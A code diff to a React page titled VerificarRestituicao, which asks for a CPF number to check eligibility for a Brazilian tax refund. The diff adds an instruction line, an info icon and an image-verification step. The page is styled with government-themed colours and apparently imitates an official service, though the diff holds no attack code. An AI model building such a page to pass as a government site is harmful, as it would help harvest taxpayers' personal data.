@@ -12,7 +12,9 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { apiRequest } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
+import { FaInfoCircle } from "react-icons/fa";
 import VerificacaoIdentidade from "../components/VerificacaoIdentidade";
+import ImageVerification from "../components/ImageVerification";
 
 // Validação de CPF
 const cpfSchema = z.object({
@@ -34,6 +36,7 @@ export default function VerificarRestituicao() {
   const [cpfConsultado, setCpfConsultado] = useState("");
   const [showVerificacao, setShowVerificacao] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const [imageVerified, setImageVerified] = useState(false);
   
   // Formulário de CPF
   const form = useForm<CpfFormType>({
@@ -167,6 +170,11 @@ export default function VerificarRestituicao() {
                 </CardDescription>
               </CardHeader>
               <CardContent className="p-8">
+                {/* Instrução para verificação */}
+                <div className="mb-4 text-[var(--gov-blue-dark)] font-medium">
+                  Para verificar se você tem direito à restituição informe os dados abaixo e clique em enviar:
+                </div>
+                
                 <Form {...form}>
                   <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                     <FormField
@@ -174,7 +182,12 @@ export default function VerificarRestituicao() {
                       name="cpf"
                       render={({ field }) => (
                         <FormItem>
-                          <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">CPF</FormLabel>
+                          <FormLabel className="text-[var(--gov-blue-dark)] font-semibold flex items-center">
+                            CPF 
+                            <span className="ml-1 text-red-500">
+                              <FaInfoCircle size={14} />
+                            </span>
+                          </FormLabel>
                           <FormControl>
                             <Input
                               placeholder="000.000.000-00"
@@ -201,11 +214,14 @@ export default function VerificarRestituicao() {
                       )}
                     />
                     
+                    {/* Verificação com imagens */}
+                    <ImageVerification onVerify={(success) => setImageVerified(success)} />
+                    
                     <div className="text-center">
                       <Button 
                         type="submit" 
                         className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold px-8 py-6 text-lg"
-                        disabled={isLoading}
+                        disabled={isLoading || !imageVerified}
                       >
                         {isLoading ? "Consultando..." : "Consultar CPF"}
                       </Button>
